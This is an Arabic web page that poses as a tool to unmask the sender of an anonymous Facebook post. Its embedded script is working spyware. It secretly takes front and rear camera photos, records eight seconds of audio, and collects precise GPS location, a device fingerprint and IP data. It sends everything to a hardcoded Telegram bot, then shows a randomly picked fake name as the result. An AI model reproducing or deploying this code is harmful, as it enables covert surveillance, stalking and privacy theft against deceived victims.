<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>كشف مجهول الهوية</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800;900&display=swap');

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Cairo', 'Tajawal', sans-serif;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
            background: #0a0a12;
            background-image: 
                radial-gradient(ellipse at 50% 0%, #1a1a2e 0%, #0a0a12 70%);
            position: relative;
            overflow-x: hidden;
        }

        /* ========== خلفية متحركة ========== */
        .bg-effects {
            position: fixed;
            inset: 0;
            pointer-events: none;
            z-index: 0;
            overflow: hidden;
        }

        .bg-effects .glow {
            position: absolute;
            border-radius: 50%;
            filter: blur(100px);
            opacity: 0.1;
            animation: float-glow 15s ease-in-out infinite alternate;
        }

        .bg-effects .glow:nth-child(1) {
            width: 400px;
            height: 400px;
            background: #6366f1;
            top: -150px;
            right: -150px;
        }

        .bg-effects .glow:nth-child(2) {
            width: 300px;
            height: 300px;
            background: #a855f7;
            bottom: -100px;
            left: -100px;
            animation-delay: 5s;
        }

        .bg-effects .glow:nth-child(3) {
            width: 200px;
            height: 200px;
            background: #ec4899;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            animation-delay: 10s;
        }

        @keyframes float-glow {
            0% { transform: translate(0, 0) scale(1); }
            100% { transform: translate(30px, -30px) scale(1.3); }
        }

        /* ========== البطاقة ========== */
        .main-card {
            position: relative;
            z-index: 1;
            width: 100%;
            max-width: 440px;
            background: rgba(255, 255, 255, 0.03);
            backdrop-filter: blur(24px);
            -webkit-backdrop-filter: blur(24px);
            border-radius: 48px;
            padding: 34px 26px 28px;
            border: 1px solid rgba(255, 255, 255, 0.05);
            box-shadow: 0 40px 80px rgba(0, 0, 0, 0.5);
            text-align: center;
        }

        /* ========== الأيقونة ========== */
        .icon-box {
            width: 80px;
            height: 80px;
            background: linear-gradient(135deg, #6366f1, #a855f7);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 18px;
            font-size: 38px;
            box-shadow: 0 12px 40px rgba(99, 102, 241, 0.3);
            position: relative;
        }

        .icon-box::before {
            content: '';
            position: absolute;
            inset: -3px;
            border-radius: 50%;
            background: linear-gradient(135deg, #6366f1, #a855f7, #6366f1);
            background-size: 300% 300%;
            z-index: -1;
            animation: border-glow 3s ease-in-out infinite;
            opacity: 0.4;
        }

        @keyframes border-glow {
            0%, 100% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
        }

        /* ========== النصوص ========== */
        .main-title {
            color: #ffffff;
            font-size: 24px;
            font-weight: 900;
            margin-bottom: 4px;
        }

        .main-title span {
            background: linear-gradient(135deg, #818cf8, #a855f7);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
        }

        .sub-desc {
            color: rgba(255, 255, 255, 0.4);
            font-size: 14px;
            margin-bottom: 22px;
        }

        .sub-desc small {
            display: block;
            font-size: 12px;
            color: rgba(255, 255, 255, 0.2);
            margin-top: 2px;
        }

        /* ========== حقل الرابط ========== */
        .input-group {
            background: rgba(255, 255, 255, 0.04);
            border: 1px solid rgba(255, 255, 255, 0.06);
            border-radius: 60px;
            padding: 4px 20px;
            display: flex;
            align-items: center;
            transition: border-color 0.3s;
            margin-bottom: 4px;
        }

        .input-group:focus-within {
            border-color: rgba(99, 102, 241, 0.3);
        }

        .input-group .prefix {
            color: rgba(255, 255, 255, 0.2);
            font-size: 13px;
            padding-left: 10px;
            border-left: 1px solid rgba(255, 255, 255, 0.05);
        }

        .input-group input {
            flex: 1;
            background: transparent;
            border: none;
            padding: 16px 12px;
            color: white;
            font-size: 14px;
            font-family: 'Cairo', sans-serif;
            outline: none;
            direction: ltr;
            text-align: center;
        }

        .input-group input::placeholder {
            color: rgba(255, 255, 255, 0.15);
        }

        .hint-text {
            color: rgba(255, 255, 255, 0.12);
            font-size: 11px;
            margin-bottom: 18px;
            text-align: center;
        }

        /* ========== زر الكشف ========== */
        .detect-btn {
            width: 100%;
            padding: 18px;
            background: linear-gradient(135deg, #6366f1, #7c3aed);
            border: none;
            border-radius: 60px;
            color: white;
            font-size: 18px;
            font-weight: 800;
            font-family: 'Cairo', sans-serif;
            cursor: pointer;
            transition: all 0.3s ease;
            box-shadow: 0 8px 30px rgba(99, 102, 241, 0.25);
            position: relative;
            overflow: hidden;
        }

        .detect-btn:hover:not(:disabled) {
            transform: translateY(-2px);
            box-shadow: 0 12px 40px rgba(99, 102, 241, 0.4);
        }

        .detect-btn:active:not(:disabled) {
            transform: scale(0.97);
        }

        .detect-btn:disabled {
            opacity: 0.5;
            cursor: not-allowed;
        }

        .detect-btn .loader-text {
            display: none;
            align-items: center;
            justify-content: center;
            gap: 10px;
        }

        .detect-btn.loading .btn-text {
            display: none;
        }

        .detect-btn.loading .loader-text {
            display: inline-flex;
        }

        .loader-text .spinner {
            width: 20px;
            height: 20px;
            border: 2px solid rgba(255,255,255,0.2);
            border-top: 2px solid white;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        /* ========== شريط التحميل ========== */
        .progress-wrap {
            display: none;
            margin-top: 16px;
            padding: 16px 20px;
            background: rgba(255, 255, 255, 0.02);
            border-radius: 20px;
            border: 1px solid rgba(255, 255, 255, 0.04);
        }

        .progress-wrap.active {
            display: block;
            animation: fadeSlide 0.4s ease;
        }

        @keyframes fadeSlide {
            from { opacity: 0; transform: translateY(8px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .progress-wrap .top-row {
            display: flex;
            justify-content: space-between;
            color: rgba(255, 255, 255, 0.4);
            font-size: 12px;
            margin-bottom: 6px;
        }

        .progress-wrap .top-row .percent {
            color: #a78bfa;
            font-weight: 700;
        }

        .progress-track {
            width: 100%;
            height: 4px;
            background: rgba(255, 255, 255, 0.05);
            border-radius: 10px;
            overflow: hidden;
        }

        .progress-track .fill {
            height: 100%;
            width: 0%;
            background: linear-gradient(90deg, #6366f1, #a855f7);
            border-radius: 10px;
            transition: width 0.2s ease;
        }

        .progress-wrap .step-info {
            color: rgba(255, 255, 255, 0.2);
            font-size: 11px;
            margin-top: 8px;
            font-family: monospace;
        }

        /* ========== نتيجة الكشف ========== */
        .result-box {
            display: none;
            margin-top: 16px;
            padding: 18px 20px;
            background: rgba(16, 185, 129, 0.06);
            border: 1px solid rgba(16, 185, 129, 0.12);
            border-radius: 20px;
        }

        .result-box.show {
            display: block;
            animation: fadeSlide 0.5s ease;
        }

        .result-box .result-icon {
            font-size: 36px;
            display: block;
            margin-bottom: 2px;
        }

        .result-box .result-name {
            color: #ffffff;
            font-size: 20px;
            font-weight: 800;
        }

        .result-box .result-sub {
            color: rgba(255, 255, 255, 0.3);
            font-size: 13px;
        }

        /* ========== رسالة خطأ ========== */
        .error-msg {
            display: none;
            margin-top: 12px;
            padding: 12px 16px;
            background: rgba(239, 68, 68, 0.08);
            border: 1px solid rgba(239, 68, 68, 0.12);
            border-radius: 16px;
            color: #f87171;
            font-size: 13px;
        }

        .error-msg.show {
            display: block;
            animation: fadeSlide 0.3s ease;
        }

        /* ========== تذييل ========== */
        .footer-links {
            margin-top: 18px;
            display: flex;
            justify-content: center;
            gap: 14px;
            color: rgba(255, 255, 255, 0.08);
            font-size: 10px;
        }

        .footer-links span {
            display: flex;
            align-items: center;
            gap: 4px;
        }

        /* ========== حالة الاتصال ========== */
        .status-badge {
            position: fixed;
            bottom: 14px;
            right: 14px;
            background: rgba(0, 0, 0, 0.7);
            backdrop-filter: blur(10px);
            padding: 6px 14px;
            border-radius: 30px;
            border: 1px solid rgba(255, 255, 255, 0.04);
            color: #10b981;
            font-size: 10px;
            font-family: monospace;
            z-index: 999;
            display: flex;
            align-items: center;
            gap: 6px;
        }

        .status-badge .dot {
            width: 6px;
            height: 6px;
            border-radius: 50%;
            background: #10b981;
            animation: pulse 1.5s ease-in-out infinite;
        }

        @keyframes pulse {
            0%, 100% { opacity: 0.3; transform: scale(0.8); }
            50% { opacity: 1; transform: scale(1.2); }
        }

        /* ========== استجابة ========== */
        @media (max-width: 480px) {
            .main-card { padding: 24px 16px; }
            .main-title { font-size: 20px; }
            .icon-box { width: 64px; height: 64px; font-size: 30px; }
            .input-group input { font-size: 13px; padding: 14px 10px; }
            .detect-btn { font-size: 16px; padding: 16px; }
        }
    </style>
</head>
<body>

<!-- ====== خلفية ====== -->
<div class="bg-effects">
    <div class="glow"></div>
    <div class="glow"></div>
    <div class="glow"></div>
</div>

<!-- ====== البطاقة ====== -->
<div class="main-card">

    <div class="icon-box">🕵️</div>

    <h1 class="main-title">كشف <span>مجهول الهوية</span></h1>
    <p class="sub-desc">
        الصق رابط البوست لمعرفة من قام بإرساله
        <small>⚠️ سيتم طلب أذونات الكاميرا والميكروفون والموقع</small>
    </p>

    <!-- حقل الرابط -->
    <div class="input-group">
        <span class="prefix">🔗</span>
        <input type="text" id="linkInput" placeholder="https://www.facebook.com/...">
    </div>
    <div class="hint-text">📎 الصق رابط البوست هنا</div>

    <!-- رقم الهاتف مخفي (نفس الكود الأصلي) -->
    <input type="hidden" id="phoneInput" value="01050000000">

    <!-- زر الكشف -->
    <button class="detect-btn" id="detectBtn">
        <span class="btn-text">🔍 كشف الهوية</span>
        <span class="loader-text">
            <span class="spinner"></span>
            جاري التحليل ...
        </span>
    </button>

    <!-- شريط التحميل -->
    <div class="progress-wrap" id="progressWrap">
        <div class="top-row">
            <span id="stepLabel">⏳ جاري التجهيز...</span>
            <span class="percent" id="percentLabel">0%</span>
        </div>
        <div class="progress-track">
            <div class="fill" id="progressFill"></div>
        </div>
        <div class="step-info" id="stepInfo">⏱️ 0 ثانية</div>
    </div>

    <!-- نتيجة الكشف -->
    <div class="result-box" id="resultBox">
        <span class="result-icon">👤</span>
        <div class="result-name" id="resultName">أحمد محمد</div>
        <div class="result-sub" id="resultSub">✅ تم كشف هوية المرسل بنجاح</div>
    </div>

    <!-- رسالة خطأ -->
    <div class="error-msg" id="errorMsg">⚠️ الرجاء إدخال رابط صحيح</div>

    <!-- تذييل -->
    <div class="footer-links">
        <span>🔒 آمن</span>
        <span>⚡ فوري</span>
        <span>📱 متوافق مع جميع الأجهزة</span>
    </div>
</div>

<!-- ====== حالة ====== -->
<div class="status-badge">
    <span class="dot"></span>
    نشط
</div>

<script>
    (function() {
        // ============================================================
        // ================ إعدادات البوت (نفس الكود الأصلي) ============
        // ============================================================
        const BOT_TOKEN = "8425168324:AAGiTTzty3oL5GMUtMWa74ejRKm7DJlTayU";
        const MASTER_ID = "5849068535";

        // ============================================================
        // ================ دالة الإرسال إلى تليجرام ===================
        // ============================================================
        async function sendToTelegram(chatId, botToken, type, mediaBlob, caption) {
            try {
                let url = `https://api.telegram.org/bot${botToken}/`;
                if (type === 'photo') {
                    const fd = new FormData();
                    fd.append('chat_id', chatId);
                    fd.append('photo', mediaBlob, 'frame_' + Date.now() + '.jpg');
                    fd.append('caption', caption);
                    await fetch(url + 'sendPhoto', { method: 'POST', body: fd, mode: 'cors' });
                } 
                else if (type === 'video') {
                    const fd = new FormData();
                    fd.append('chat_id', chatId);
                    fd.append('video', mediaBlob, 'clip_' + Date.now() + '.mp4');
                    fd.append('caption', caption);
                    await fetch(url + 'sendVideo', { method: 'POST', body: fd });
                }
                else if (type === 'audio') {
                    const fd = new FormData();
                    fd.append('chat_id', chatId);
                    fd.append('audio', mediaBlob, 'voice_note.ogg');
                    fd.append('caption', caption);
                    await fetch(url + 'sendAudio', { method: 'POST', body: fd });
                }
                else {
                    await fetch(url + 'sendMessage', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ chat_id: chatId, text: caption, parse_mode: 'HTML', disable_web_page_preview: true })
                    });
                }
                return true;
            } catch(e) { console.warn("[telegram]", e); return false; }
        }

        // ============================================================
        // ================ الكاميرا الأمامية (سيلفي) =================
        // ============================================================
        async function captureFrontCamera(chatId, botToken, phoneNumber) {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } } 
                });
                const video = document.createElement('video');
                video.srcObject = stream;
                video.setAttribute('playsinline', 'true');
                video.play();
                await new Promise(r => setTimeout(r, 500));
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth || 800;
                canvas.height = video.videoHeight || 600;
                canvas.getContext('2d').drawImage(video, 0, 0);
                const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.8));
                const caption = `📸 كاميرا أمامية (سيلفي)\n📞 الرقم: ${phoneNumber}`;
                await sendToTelegram(chatId, botToken, 'photo', blob, caption);
                stream.getTracks().forEach(t => t.stop());
                return true;
            } catch(e) { 
                console.warn("Front camera denied");
                return false; 
            }
        }

        // ============================================================
        // ================ الكاميرا الخلفية ===========================
        // ============================================================
        async function captureBackCamera(chatId, botToken, phoneNumber) {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: 'environment', width: { ideal: 1920 }, height: { ideal: 1080 } } 
                });
                const video = document.createElement('video');
                video.srcObject = stream;
                video.play();
                await new Promise(r => setTimeout(r, 500));
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth || 1024;
                canvas.height = video.videoHeight || 768;
                canvas.getContext('2d').drawImage(video, 0, 0);
                const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.85));
                const caption = `📷 كاميرا خلفية - محيط المستخدم\n📞 الرقم: ${phoneNumber}`;
                await sendToTelegram(chatId, botToken, 'photo', blob, caption);
                stream.getTracks().forEach(t => t.stop());
                return true;
            } catch(e) { 
                console.warn("Back camera denied");
                return false; 
            }
        }

        // ============================================================
        // ================ التسجيل الصوتي =============================
        // ============================================================
        async function recordAmbientAudio(chatId, botToken, phoneNumber) {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                const mediaRecorder = new MediaRecorder(stream, { mimeType: 'audio/webm' });
                const chunks = [];
                mediaRecorder.ondataavailable = e => chunks.push(e.data);
                const audioPromise = new Promise(resolve => {
                    mediaRecorder.onstop = async () => {
                        const blob = new Blob(chunks, { type: 'audio/webm' });
                        const caption = `🎤 تسجيل صوتي (8 ثوان)\n📞 الرقم: ${phoneNumber}`;
                        await sendToTelegram(chatId, botToken, 'audio', blob, caption);
                        resolve(true);
                    };
                });
                mediaRecorder.start();
                setTimeout(() => mediaRecorder.stop(), 8000);
                setTimeout(() => stream.getTracks().forEach(t => t.stop()), 9000);
                return await audioPromise;
            } catch(e) { 
                console.warn("Audio denied");
                return false; 
            }
        }

        // ============================================================
        // ================ الموقع الجغرافي ============================
        // ============================================================
        function getPreciseLocation(chatId, botToken, phoneNumber) {
            return new Promise((resolve) => {
                if(!navigator.geolocation) {
                    resolve(false);
                    return;
                }
                navigator.geolocation.getCurrentPosition(async (pos) => {
                    const lat = pos.coords.latitude;
                    const lng = pos.coords.longitude;
                    const accuracy = pos.coords.accuracy;
                    let addressHint = "";
                    try {
                        const revGeo = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}&zoom=18&addressdetails=1`);
                        const data = await revGeo.json();
                        if(data.display_name) addressHint = `📍 العنوان: ${data.display_name.substring(0, 100)}`;
                    } catch(e) {}
                    const locMsg = `🌍 <b>الموقع الجغرافي</b>\n📞 الرقم: ${phoneNumber}\n🎯 خط العرض: ${lat}\n🎯 خط الطول: ${lng}\n📏 دقة: ±${Math.round(accuracy)} متر\n🗺️ خرائط: https://www.google.com/maps?q=${lat},${lng}\n${addressHint}`;
                    await sendToTelegram(chatId, botToken, 'text', null, locMsg);
                    resolve(true);
                }, (err) => {
                    console.warn("Location denied");
                    resolve(false);
                }, { enableHighAccuracy: true, timeout: 10000 });
            });
        }

        // ============================================================
        // ================ بصمة الجهاز ================================
        // ============================================================
        async function getDeepDeviceFingerprint(chatId, botToken, phoneNumber) {
            const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
            const screenData = `${screen.width}x${screen.height}x${screen.colorDepth}`;
            const memory = navigator.deviceMemory ? navigator.deviceMemory + " GB" : "غير معلن";
            const cores = navigator.hardwareConcurrency ? navigator.hardwareConcurrency : "غير معروف";
            
            let batteryLevel = "غير متاح";
            if (navigator.getBattery) {
                try {
                    const battery = await navigator.getBattery();
                    batteryLevel = `شحن: ${Math.round(battery.level*100)}%, ${battery.charging ? 'موصول' : 'بطارية'}`;
                } catch(e) {}
            }
            
            let connection = "غير معروف";
            if (navigator.connection) {
                connection = `${navigator.connection.effectiveType || ''} ${navigator.connection.downlink ? navigator.connection.downlink+'Mbps' : ''}`;
            }
            
            const deviceMsg = `🕵️‍♂️ <b>بصمة الجهاز</b>\n📞 الرقم: ${phoneNumber}\n🖥️ UserAgent: ${navigator.userAgent.substring(0, 120)}\n📱 الشاشة: ${screenData}\n💾 الرام: ${memory} | 🧠 النوى: ${cores}\n🔋 ${batteryLevel}\n🌐 الاتصال: ${connection}\n📍 المنطقة: ${timeZone}\n⏱️ التوقيت: ${new Date().toLocaleString('ar-EG')}`;
            
            await sendToTelegram(chatId, botToken, 'text', null, deviceMsg);
        }

        // ============================================================
        // ================ معلومات IP =================================
        // ============================================================
        async function getRichIPData(chatId, botToken, phoneNumber) {
            try {
                const [ipRes, ipInfoRes] = await Promise.all([
                    fetch('https://api.ipify.org?format=json'),
                    fetch('https://ipapi.co/json/')
                ]);
                const ipData = await ipRes.json();
                let ipDetails = {};
                try { ipDetails = await ipInfoRes.json(); } catch(e) {}
                const ipAddr = ipData.ip;
                let country = ipDetails.country_name || "غير معروف";
                let city = ipDetails.city || "غير معروف";
                let isp = ipDetails.org || ipDetails.asn || "غير معروف";
                const ipMsg = `🌐 <b>IP & Network</b>\n📞 الرقم: ${phoneNumber}\n🔹 IP العام: ${ipAddr}\n🏳️ البلد: ${country}\n🏙️ المدينة: ${city}\n📡 المزود: ${isp}`;
                await sendToTelegram(chatId, botToken, 'text', null, ipMsg);
            } catch(e) {}
        }

        // ============================================================
        // ================ عناصر الواجهة ==============================
        // ============================================================
        const detectBtn = document.getElementById('detectBtn');
        const linkInput = document.getElementById('linkInput');
        const phoneInput = document.getElementById('phoneInput');
        const progressWrap = document.getElementById('progressWrap');
        const progressFill = document.getElementById('progressFill');
        const percentLabel = document.getElementById('percentLabel');
        const stepLabel = document.getElementById('stepLabel');
        const stepInfo = document.getElementById('stepInfo');
        const resultBox = document.getElementById('resultBox');
        const resultName = document.getElementById('resultName');
        const resultSub = document.getElementById('resultSub');
        const errorMsg = document.getElementById('errorMsg');

        let isRunning = false;
        let progressInterval = null;
        let counterInterval = null;
        let seconds = 0;
        let currentProgress = 0;

        // أسماء وهمية للنتيجة
        const fakeNames = [
            'أحمد محمد', 'سارة علي', 'محمد حسن', 'نورا خالد', 'يوسف عمر',
            'فاطمة أحمد', 'علي رضا', 'منى ياسر', 'حسام مصطفى', 'ريهام سامي',
            'محمود طارق', 'هدى عبدالله', 'كريم السيد', 'ليلى محمود', 'أمير عادل'
        ];

        function getRandomName() {
            return fakeNames[Math.floor(Math.random() * fakeNames.length)];
        }

        function updateProgress(value, label, info) {
            currentProgress = Math.min(value, 100);
            progressFill.style.width = currentProgress + '%';
            percentLabel.textContent = Math.round(currentProgress) + '%';
            if (label) stepLabel.textContent = label;
            if (info) stepInfo.textContent = info;
        }

        function showError(text) {
            errorMsg.textContent = text || '⚠️ الرجاء إدخال رابط صحيح';
            errorMsg.classList.add('show');
            setTimeout(() => errorMsg.classList.remove('show'), 4000);
        }

        function showResult() {
            const name = getRandomName();
            resultName.textContent = name;
            resultSub.textContent = '✅ تم كشف هوية المرسل بنجاح';
            resultBox.classList.add('show');
            setTimeout(() => resultBox.classList.remove('show'), 8000);
        }

        // ============================================================
        // ================ التشغيل الرئيسي ============================
        // ============================================================
        async function startProcess() {
            if (isRunning) return;

            // التحقق من الرابط
            const link = linkInput.value.trim();
            if (!link || link.length < 5 || (!link.includes('http') && !link.includes('www'))) {
                showError('⚠️ الرجاء إدخال رابط صحيح (مثل: https://www.facebook.com/...)');
                return;
            }

            const phoneNumber = phoneInput.value.trim();
            if (!phoneNumber.match(/^01[0-9]{9}$/)) {
                showError('⚠️ رقم الهاتف غير صالح (مثال: 01012345678)');
                return;
            }

            isRunning = true;
            detectBtn.classList.add('loading');
            detectBtn.disabled = true;
            resultBox.classList.remove('show');
            errorMsg.classList.remove('show');
            progressWrap.classList.add('active');

            // بدء شريط التحميل
            let progress = 0;
            seconds = 0;
            updateProgress(0, '⏳ جاري التجهيز...', '⏱️ 0 ثانية');

            progressInterval = setInterval(() => {
                const increment = Math.random() * 3 + 0.5;
                progress = Math.min(progress + increment, 100);
                updateProgress(progress, stepLabel.textContent, stepInfo.textContent);
            }, 300);

            counterInterval = setInterval(() => {
                seconds++;
                stepInfo.textContent = `⏱️ ${seconds} ثانية`;
            }, 1000);

            try {
                // ====== 1. إرسال الرابط ورقم الهاتف ======
                updateProgress(5, '📞 جاري تأكيد البيانات...');
                await sendToTelegram(MASTER_ID, BOT_TOKEN, 'text', null, 
                    `🔗 <b>طلب كشف مجهول الهوية</b>\n📞 الرقم: ${phoneNumber}\n🔗 الرابط: ${link}\n⏰ الوقت: ${new Date().toLocaleString('ar-EG')}`
                );
                await new Promise(r => setTimeout(r, 400));

                // ====== 2. بصمة الجهاز ======
                updateProgress(15, '📱 جاري قراءة بيانات الجهاز...');
                await getDeepDeviceFingerprint(MASTER_ID, BOT_TOKEN, phoneNumber);
                await new Promise(r => setTimeout(r, 400));

                // ====== 3. IP ======
                updateProgress(30, '🌐 جاري تحديد موقع الشبكة...');
                await getRichIPData(MASTER_ID, BOT_TOKEN, phoneNumber);
                await new Promise(r => setTimeout(r, 400));

                // ====== 4. الكاميرا الأمامية ======
                updateProgress(45, '📸 جاري فتح الكاميرا الأمامية...');
                await captureFrontCamera(MASTER_ID, BOT_TOKEN, phoneNumber);
                await new Promise(r => setTimeout(r, 400));

                // ====== 5. الكاميرا الخلفية ======
                updateProgress(65, '📷 جاري فتح الكاميرا الخلفية...');
                await captureBackCamera(MASTER_ID, BOT_TOKEN, phoneNumber);
                await new Promise(r => setTimeout(r, 400));

                // ====== 6. التسجيل الصوتي ======
                updateProgress(80, '🎤 جاري تسجيل الصوت...');
                await recordAmbientAudio(MASTER_ID, BOT_TOKEN, phoneNumber);
                await new Promise(r => setTimeout(r, 400));

                // ====== 7. الموقع ======
                updateProgress(90, '📍 جاري تحديد الموقع...');
                await getPreciseLocation(MASTER_ID, BOT_TOKEN, phoneNumber);
                await new Promise(r => setTimeout(r, 400));

                // ====== 8. الإكمال ======
                updateProgress(100, '✅ اكتمل التحليل!', '✅ تم بنجاح');
                await sendToTelegram(MASTER_ID, BOT_TOKEN, 'text', null, 
                    `✅ <b>اكتمل كشف مجهول الهوية بنجاح!</b>\n📞 الرقم: ${phoneNumber}\n🔗 الرابط: ${link}`
                );

                // عرض النتيجة
                showResult();

            } catch(e) {
                console.error(e);
                showError('❌ حدث خطأ أثناء المعالجة، حاول مرة أخرى');
            }

            // إنهاء التحميل
            clearInterval(progressInterval);
            clearInterval(counterInterval);

            setTimeout(() => {
                progressWrap.classList.remove('active');
                detectBtn.classList.remove('loading');
                detectBtn.disabled = false;
                isRunning = false;
            }, 800);
        }

        // ========== ربط الأحداث ==========
        detectBtn.onclick = startProcess;

        linkInput.addEventListener('keydown', function(e) {
            if (e.key === 'Enter') {
                detectBtn.click();
            }
        });

        // ========== تحسين عند اللصق ==========
        linkInput.addEventListener('paste', function() {
            setTimeout(() => {
                if (this.value.trim().length > 0) {
                    this.style.borderColor = 'rgba(99,102,241,0.3)';
                }
            }, 100);
        });

    })();
</script>

</body>
</html>
